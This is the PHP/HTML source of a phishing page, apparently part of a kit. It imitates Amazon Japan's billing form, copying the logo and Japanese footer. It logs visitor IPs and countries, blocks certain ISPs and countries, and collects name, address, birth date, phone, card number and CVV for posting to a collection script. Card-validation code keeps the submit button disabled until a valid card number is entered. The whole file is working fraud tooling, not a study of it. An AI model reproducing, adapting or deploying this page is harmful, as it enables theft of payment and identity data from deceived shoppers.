<?php

session_start();
include('../__CONFIG__.php');
include '../bahasa.php';
require "../Library/ClassFunction/Blockisp.php";
include '../block_country.php';
include '../Library/ClassFunction/curldataip.php';

$file = fopen('../panel/country.txt', "a");
$time = date('H:i dS F');
fwrite ($file, " IP $showIP Dari $showCountry Mengakses Billing Page\r\n ");
fclose( $file );



   ?>
<!doctype html>
<html lang="en">
   <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <!-- Required meta tags -->
      
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <!-- Bootstrap CSS -->
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="style.css" />
      <link rel="stylesheet" href="../Sheets/mobile.css">
      <link rel="stylesheet" href="../Sheets/accbilling.css">
      <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script type='text/javascript' src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
      
   </head>
   <!-- Navbar -->
   <body>
      <nav class="navbar navbar-default">
         <a class="navbar-brand" href="#">
         <img src="http://pngimg.com/uploads/amazon/amazon_PNG11.png" width="90" height="30" alt="">
         </a>
      </nav>
      <div class="a-container">
         <form name="signIn" method="post" action="../Actions/paymentmob.php" class="auth-validate-form auth-clearable-form" data-fwcim-id="r8JCGHxQ">
            <div>
               <h1 class="a-spacing-micro a-spacing-top-small a-text-left"> <?php echo $cbmyba; ?></h1>
            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
                <!--ini form buat fullname-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="fullname" placeholder="<?php echo $fnn ?>" name="fullname" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat address 1-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="adressline1" placeholder="<?php echo $sap ?>" name="address1" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat address 2-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="adressline2" placeholder="<?php echo $apsub ?>" name="address2" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat city-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="adressline2" placeholder="<?php echo $ctyy ?>" name="city" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat state-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="city" placeholder="<?php echo $sprr; ?>" name="state" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat zip-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="zipCode" placeholder="<?php echo $zco; ?>" name="zip" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat country-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="country" value="<?php echo $showCountry; ?>" placeholder="<?php echo $conco ?>" name="country" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat birth-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="birth" placeholder="DD/MM/YYYY" name="dob" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat phone-->
               <div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                  <input type="tel" maxlength="1024" id="input-phone" placeholder="<?php echo $panu; ?>" name="phone" tabindex="2">
                  <div class="a-row auth-visible-password-container auth-show-password-empty">
                     <span class="a-size-small a-color-secondary auth-visible-password"></span>
                  </div>
               </div>
               <div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked"> 
            </div>
            <!--ini akhir dari billing -->
            <!--ini bagian credit card-->
            <h1 class="a-spacing-micro a-spacing-top-small a-text-left"> <?php echo $cypm; ?></h1>
            <!--ini fullname-->
            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
            <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="nameoncard" placeholder="<?php echo $chn ?>" name="nameoncard" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini buat cc-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="tel" maxlength="128" id="id_xccaaa" placeholder="カード番号" name="credit_card" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini cvv-->
               <div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                  <input type="text" class="form-control amazoninput" name="cvv_card" id="xc" placeholder="CVV/CVV2" maxlength="4" required>
                  <div class="a-row auth-visible-password-container auth-show-password-empty">
                     <span class="a-size-small a-color-secondary auth-visible-password"></span>
                  </div>
               </div>
               <div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked"> 
            </div>
            </div>
            <!-- ini date cc -->
<div class="form-group-row">
  <div class="col-4" style="border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:40%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
     <label for="months"></label>
      <select name='month' style='background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;' required>
           <option value='01'>01</option>
           <option value='02' selected="selected">02</option>
           <option value='03'>03</option>
           <option value='04'>04</option>
           <option value='05'>05</option>
           <option value='06'>06</option>
           <option value='07'>07</option>
           <option value='08'>08</option>
           <option value='09'>09</option>
           <option value='10'>10</option>
           <option value='11'>11</option>
           <option value='12'>12</option>
        </select>
       </div>

<div class="col-7 auth-required-field auth-fill-claim" style="margin-left:border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:58.5%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;">
	<label for="months"></label>
         <select name="year" style="background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;" required="">
             <option value="<?php  echo date("Y");?>" selected=""><?php  echo date("Y");?></option>
	     <option value="<?php  echo date("Y")+1;?>"><?php  echo date("Y")+1;?></option>
	     <option value="<?php  echo date("Y")+2;?>"><?php  echo date("Y")+2;?></option>
	     <option value="<?php  echo date("Y")+3;?>"><?php  echo date("Y")+3;?></option>
				<option value="<?php  echo date("Y")+4;?>">
                  <?php  echo date("Y")+4;?>
                </option>
				<option value="<?php  echo date("Y")+5;?>">
                  <?php  echo date("Y")+5;?>
                </option>
				<option value="<?php  echo date("Y")+6;?>">
                  <?php  echo date("Y")+6;?>
                </option>
				<option value="<?php  echo date("Y")+7;?>">
                  <?php  echo date("Y")+7;?>
                </option>
				<option value="<?php  echo date("Y")+8;?>">
                  <?php  echo date("Y")+8;?>
                </option>
				<option value="<?php  echo date("Y")+9;?>">
                  <?php  echo date("Y")+9;?>
                </option>
				<option value="<?php  echo date("Y")+10;?>">
                  <?php  echo date("Y")+10;?>
                </option>
				<option value="<?php  echo date("Y")+11;?>">
                  <?php  echo date("Y")+11;?>
                </option>
				<option value="<?php  echo date("Y")+12;?>">
                  <?php  echo date("Y")+12;?>
                </option>
				<option value="<?php  echo date("Y")+13;?>">
                  <?php  echo date("Y")+13;?>
                </option>
				<option value="<?php  echo date("Y")+14;?>">
                  <?php  echo date("Y")+14;?>
                </option>
				<option value="<?php  echo date("Y")+15;?>">
                  <?php  echo date("Y")+15;?>
                </option>
				<option value="<?php  echo date("Y")+16;?>">
                  <?php  echo date("Y")+16;?>
                </option>
				<option value="<?php  echo date("Y")+17;?>">
                  <?php  echo date("Y")+17;?>
                </option>
				<option value="<?php  echo date("Y")+18;?>">
                  <?php  echo date("Y")+18;?>
                </option>
				<option value="<?php  echo date("Y")+19;?>">
                  <?php  echo date("Y")+19;?>
                </option>
                                                </select>
                                        </div>
                                    </div>
                                </div>
                                </div>
            <!--akhir dari credit card-->
            <div class="a-section">
                     <div class="a-button-stack">
                        <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-share-credential-off"><span class="a-button-inner"><input id="signInSubmit" tabindex="6" class="a-button-input" type="submit" name="sex" aria-labelledby="auth-signin-button-announce" disabled="disabled"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                        ログイン
                        </span></span></span>
                        </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </form>
      </div>
      <footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
  <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v1">
<div class="icp-container-mobile">
<style type="text/css">
  #icp-touch-link-language { display: none; }
</style>
<a href="https://www.amazon.co.jp/gp/customer-preferences/select-language/ref=footer_lang_t1?ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin%3FclientContext%3D357-0249111-9181918%26openid.return_to%3Dhttps%253A%252F%252Fwww.amazon.co.jp%252Fcpe%252Fmanagepaymentmethods%253F_encoding%253DUTF8%2526ref_%253Dya_mb_mpo%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.assoc_handle%3Djpflex%26openid.mode%3Dcheckid_setup%26marketPlaceId%3DA1VC38T7YXB528%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26pageId%3Djpflex%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.pape.max_auth_age%3D900%26siteState%3DclientContext%253D356-3321293-2507529%252CsourceUrl%253Dhttps%25253A%25252F%25252Fwww.amazon.co.jp%25252Fcpe%25252Fmanagepaymentmethods%25253F_encoding%25253DUTF8%252526ref_%25253Dya_mb_mpo%252Csignature%253DIrvj2FKqnUXzzw0xrNeKuvTU2DZC4j3D" class="icp-button" id="icp-touch-link-language">
  <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">日本語</span><span class="nav-arrow icp-up-down-arrow"></span><span class="aok-hidden" style="display:none">ショッピングのための言語を選択します。</span>
</a>
<style type="text/css">
#icp-touch-link-country { display: none; }
</style>
<a href="https://www.amazon.co.jp/gp/navigation-country/select-country/ref=footer_icp_cp_t1?ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin%3FclientContext%3D357-0249111-9181918%26openid.return_to%3Dhttps%253A%252F%252Fwww.amazon.co.jp%252Fcpe%252Fmanagepaymentmethods%253F_encoding%253DUTF8%2526ref_%253Dya_mb_mpo%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.assoc_handle%3Djpflex%26openid.mode%3Dcheckid_setup%26marketPlaceId%3DA1VC38T7YXB528%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26pageId%3Djpflex%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.pape.max_auth_age%3D900%26siteState%3DclientContext%253D356-3321293-2507529%252CsourceUrl%253Dhttps%25253A%25252F%25252Fwww.amazon.co.jp%25252Fcpe%25252Fmanagepaymentmethods%25253F_encoding%25253DUTF8%252526ref_%25253Dya_mb_mpo%252Csignature%253DIrvj2FKqnUXzzw0xrNeKuvTU2DZC4j3D" class="icp-button" id="icp-touch-link-country">
  <span class="icp-flag-3 icp-flag-3-jp"></span><span class="icp-color-base">日本</span><span class="aok-hidden" style="display:none">ショッピングのための国/地域を選択します。</span>
</a>
</div>
<ul class="nav-ftr-horiz nav-ftr-big "><li class="nav-li "><a href="/gp/aw/sh.html?ie=UTF8&amp;ref_=navm_ftr_sh" class="nav-a">検索・閲覧履歴</a></li></ul>
<ul class="nav-ftr-horiz "><li class="nav-li "><a href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=643006&amp;ref_=navm_ftr_cou" class="nav-a">利用規約</a></li><li class="nav-li "><a href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=643000&amp;ref_=navm_ftr_mpa" class="nav-a">プライバシー規約</a></li><li class="nav-li "><a href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=201047280&amp;ref_=navm_ftr_iba" class="nav-a">パーソナライズド広告規約</a></li></ul>
<div id="nav-ftr-copyright">© 2000-2020, Amazon.com, Inc. and its affiliates</div>
  </div>
</footer>
      
      
    <script src="../Library/Cleave/dist/cleave.js"></script>
    <script src="../Library/Cleave/dist/addons/cleave-phone.i18n.js"></script>
    <!--this For date-->
    <script>
        new Cleave('#birth', {
                date: true,
                datePattern: ['d', 'm', 'Y']
        });
        new Cleave('#id_xccaaa', {
            creditCard: true,
        })
        new Cleave('#input-phone', {
            phone: true,
            phoneRegionCode: 'JP'
        });
    </script>
    <script>
    var acceptedCreditCards = {
  visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
  mastercard: /^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/,
  amex: /^3[47][0-9]{13}$/,
  discover: /^65[4-9][0-9]{13}|64[4-9][0-9]{13}|6011[0-9]{12}|(622(?:12[6-9]|1[3-9][0-9]|[2-8][0-9][0-9]|9[01][0-9]|92[0-5])[0-9]{10})$/,
  diners_club: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
  jcb: /^(?:2131|1800|35[0-9]{3})[0-9]{11}$/,
};

$('input[id="id_xccaaa"], input[id="xc"]').on('input', function(){
  if (validateCard($('input[id="id_xccaaa"]').val()) && validateCVV($('input[id="id_xccaaa"]').val(), $('input[id="xc"]').val())) {
    $('input[type="submit"]').prop('disabled', false);
  } else {
    $('input[type="submit"]').prop('disabled', true);
  }
});

function validateCard(value) {
  // remove all non digit characters
  var value = value.replace(/\D/g, '');
  var sum = 0;
  var shouldDouble = false;
  // loop through values starting at the rightmost side
  for (var i = value.length - 1; i >= 0; i--) {
    var digit = parseInt(value.charAt(i));

    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }
  
  var valid = (sum % 10) == 0;
  var accepted = false;
  
  // loop through the keys (visa, mastercard, amex, etc.)
  Object.keys(acceptedCreditCards).forEach(function(key) {
    var regex = acceptedCreditCards[key];
    if (regex.test(value)) {
      accepted = true;
    }
  });
  
  return valid && accepted;
}


function validateCVV(creditCard, cvv) {
  // remove all non digit characters
  var creditCard = creditCard.replace(/\D/g, '');
  var cvv = cvv.replace(/\D/g, '');
  // american express and cvv is 4 digits
  if ((acceptedCreditCards.amex).test(creditCard)) {
    if((/^\d{4}$/).test(cvv))
      return true;
  } else if ((/^\d{3}$/).test(cvv)) { // other card & cvv is 3 digits
    return true;
  }
  return false;
}
</script>
   </body>
</html>